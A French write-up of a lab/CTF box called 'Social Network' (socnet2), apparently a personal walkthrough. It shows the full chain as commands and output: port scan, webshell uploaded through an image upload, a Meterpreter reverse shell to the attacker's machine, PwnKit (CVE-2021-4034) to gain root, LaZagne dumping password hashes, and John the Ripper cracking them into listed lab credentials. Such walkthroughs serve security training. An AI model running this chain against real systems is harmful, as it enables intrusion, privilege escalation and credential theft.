# Social Network

1.Énumération

**<span style="color: #dddddd;">👁️</span> Massap**

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $sudo sh massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] Scan IP: 192.168.56.138
[i] Rate: 1000
 
[+] Scan Masscan 192.168.56.138...100%
[+] Scan Nmap 192.168.56.138...100%
 
[+] 80/tcp open
[+] 8000/tcp open
[+] 22/tcp open
 
==========================================================
|                         Rapports                       |
==========================================================
| Nmap:/home/m0rph3u5/Massap/192.168.56.138-tcp.html     |
==========================================================
```

&nbsp;

Le serveur hébergeait un genre de réseau sociaux , je me suis inscrit , et j’ai pu constater dans la parti post que l’on pouvais uploads une image , j’ai mis une `webshell`

<img width="1097" height="800" alt="Capture du 2025-03-06 19-39-30" src="https://github.com/user-attachments/assets/5631ac9d-3d18-43cf-98b9-be669819d543" />

&nbsp;

**<span style="color: #dddddd;">💥</span> Metasploit - webshell**

```
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set verbose true
verbose => true
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
[*] Started reverse TCP handler on 192.168.56.104:4444 
[*] Sending stage (40004 bytes) to 192.168.56.138
[*] Meterpreter session 1 opened (192.168.56.104:4444 -> 192.168.56.138:60184) at 2025-03-06 19:29:05 +0100

(Meterpreter 1)(/var/www/html/data/images/posts) >
```

&nbsp;

**<span style="color: #dddddd;">🤖</span> Linpeas**

Elevation de privilege

```
www-data@socnet2:/tmp$ sh linpeas.sh

╔══════════╣ Executing Linux Exploit Suggester
╚[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
```

&nbsp;

**<span style="color: #dddddd;"><span style="color: #dddddd;">💀</span> Exploit Pwnkit</span>**

<span style="color: #dddddd;">Test de l'exploit</span>

```
www-data@socnet2:/tmp$ ./PwnKit  
./PwnKit
root@socnet2:/tmp#
```

&nbsp;

**<span style="color: #dddddd;">👾</span>  Lazagne**

Voyons si lazagne trouve des choses intéressante 

```
root@socnet2:/tmp/LaZagne-2.4.6/Linux# python laZagne.py all
python laZagne.py all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


------------------- Grub passwords -----------------

[+] Hash found !!!
Hash: $1$gLhU0/$aW78kHK1QfV3P2b2znUoe/

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: socnet
Hash: $6$dF89FbLlk3dIJeo4$iEeus5kPteNqivMT5Bt7o3rNtIv0oWQug63syktfj9zwYoeP5tvfc1ve9GsfjyOFz5sRxEIjoueHKtTJTyxS9/:17833:0:99999:7:::


[+] 2 passwords have been found.
For more information launch it again with the -v option

elapsed time = 2.2199819088
```

&nbsp;

🧨**JohnTheRipper**

Crack des hash 

```
┌──[m0rph3u5@parrot]─[~/Desktop]
└──╼ $john socnet2 --wordlist=Desktop/rockyou.txt
Using default input encoding: UTF-8
Loaded 2 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
andrew1995	 (socnet)
topsecret        (?)
1g 0:00:02:19 DONE (2025-03-05 20:28) 0.007178g/s 1857p/s 1857c/s 1857C/s thebest15..teladan
Use the "--show" option to display all of the cracked passwords reliably

┌──[parrot@parrot]─[~/Desktop]
└──╼ $john socnet2 --show
socnet:andrew1995:18503:0:99999:7:::
?:topsecret
```

&nbsp;

Identifiant trouver

| Users | Passwords |
| --- | --- |
| socnet | andrew1995 |
| ?   | topsecret |

&nbsp;
